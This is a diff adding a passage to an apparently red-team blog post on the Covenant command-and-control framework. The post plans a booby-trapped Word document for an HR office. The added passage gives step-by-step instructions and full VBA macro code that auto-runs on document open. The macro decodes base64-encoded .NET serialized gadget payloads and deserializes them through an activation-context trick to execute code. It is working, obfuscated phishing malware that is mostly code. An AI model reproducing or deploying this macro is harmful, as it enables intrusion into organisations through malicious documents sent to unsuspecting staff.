@@ -446,3 +446,121 @@ Below the custom word document that we will deliver to the HR office as part of 
   <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov10.JPG">
 </p>
 
+We will now go on and add our malicious macro. We can access the Macro menu by navigating to the View tab and selecting Macros.
+From the Macros dialog window, we must choose the current document from the drop down menu. 
+Verify this to ensure that the VBA code is only embedded in this document, otherwise the VBA code will be saved to our global template.
+
+
+<p align="center">
+  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov11.JPG">
+</p>
+
+After selecting the current document, we’ll enter a name for the macro. In this example, we’ll 
+name the macro “Exec” and then select Create. This will launch the VBA editor where we can run and debug the code. 
+Now copy inside the VBA editor the following adapted VBA code:
+
+```vba
+Function b64Decode(ByVal enc)
+    Dim xmlObj, nodeObj
+    Set xmlObj = CreateObject("Msxml2.DOMDocument.3.0")
+    Set nodeObj = xmlObj.CreateElement("base64")
+    nodeObj.dataType = "bin.base64"
+    nodeObj.Text = enc
+    b64Decode = nodeObj.nodeTypedValue
+    Set nodeObj = Nothing
+    Set xmlObj = Nothing
+End Function
+
+Function Exec()
+    
+	Dim stage_1, stage_2
+
+stage_1 = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVy"
+stage_1 = stage_1 & "ZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0"
+stage_1 = stage_1 & "LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxxA8UmVz"
+stage_1 = stage_1 & "b3VyY2VEaWN0aW9uYXJ5DQogICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2"
+stage_1 = stage_1 & "aW5nc30iIE1ldGhvZE5hbWUgPSJTZXQiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBh"
+stage_1 = stage_1 & "cmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+bWljcm9zb2Z0OldvcmtmbG93Q29tcG9uZW50TW9k"
+stage_1 = stage_1 & "ZWw6RGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAg"
+stage_1 = stage_1 & "ICAgICAgPHM6U3RyaW5nPnRydWU8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5N"
+stage_1 = stage_1 & "ZXRob2RQYXJhbWV0ZXJzPg0KICAgICAgICAgICAgICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KICAgICAgICAgICAgPC9SZXNv"
+stage_1 = stage_1 & "dXJjZURpY3Rpb25hcnk+Cw=="
+
+    
+stage_2 = "AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRy"
+stage_2 = stage_2 & "YWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUB"
+stage_2 = stage_2 & "AAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMd7AAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29s"
+stage_2 = stage_2 & "bGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9"
+stage_2 = stage_2 & "bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkC"
+stage_2 = stage_2 & "ZSkGfwAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS5UeXBlKQgAAAAKAU4AAAAPAAAABoAAAAAmU3lzdGVt"
+stage_2 = stage_2 & "LkNvbXBvbmVudE1vZGVsLkRlc2lnbi5Db21tYW5kSUQEAAAACToAAAAQTwAAAAIAAAAJggAAAAgIACAAAASCAAAAC1N5c3RlbS5H"
+stage_2 = stage_2 & "dWlkCwAAAAJfYQJfYgJfYwJfZAJfZQJfZgJfZwJfaAJfaQJfagJfawAAAAAAAAAAAAAACAcHAgICAgICAgITE9J07irREYv7AKDJ"
+stage_2 = stage_2 & "Dyb3Cws="
+
+
+    Dim stm_1 As Object, fmt_1 As Object
+    
+    manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?>"
+	manifest = manifest & "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
+	manifest = manifest & "<assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />"
+	manifest = manifest & "<clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Serialization"
+	manifest = manifest & ".Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" "
+	manifest = manifest & "runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" "
+	manifest = manifest & "progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" /></assembly>"
+
+
+    Set actCtx = CreateObject("Microsoft.Windows.ActCtx")
+    actCtx.ManifestText = manifest
+        
+    Set stm_1 = actCtx.CreateObject("System.IO.MemoryStream")
+    Set fmt_1 = actCtx.CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
+
+    Dim Decstage_1
+    Decstage_1 = b64Decode(stage_1)
+
+    For Each i In Decstage_1
+        stm_1.WriteByte i
+    Next i
+
+    On Error Resume Next
+
+    stm_1.Position = 0
+    Dim o1 As Object
+    Set o1 = fmt_1.Deserialize_2(stm_1)
+
+    If Err.Number <> 0 Then
+       Dim stm_2 As Object
+       
+       Set stm_2 = actCtx.CreateObject("System.IO.MemoryStream")
+
+       Dim Decstage_2
+       Decstage_2 = b64Decode(stage_2)
+
+       For Each j In Decstage_2
+        stm_2.WriteByte j
+       Next j
+
+       stm_2.Position = 0
+       Dim o2 As Object
+       Set o2 = fmt_1.Deserialize_2(stm_2)
+    End If
+
+End Function
+
+Sub Document_Open()
+ Exec
+End Sub
+
+Sub AutoOpen()
+ Exec
+End Sub
+```
+
+Save the VBA code and now, in order for this to work, we must save our document in a Macro-Enabled format such as .doc or  .docm; Unfortunately, the newer .docx will not store macros.
+
+Now that the document is saved, we can try opening it again. However, we are presented with a security warning banner.
+If we press the Enable Content button, the macro will execute and the message box will appear as illustrated below. 
+
+<p align="center">
+  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov12.JPG">
+</p>
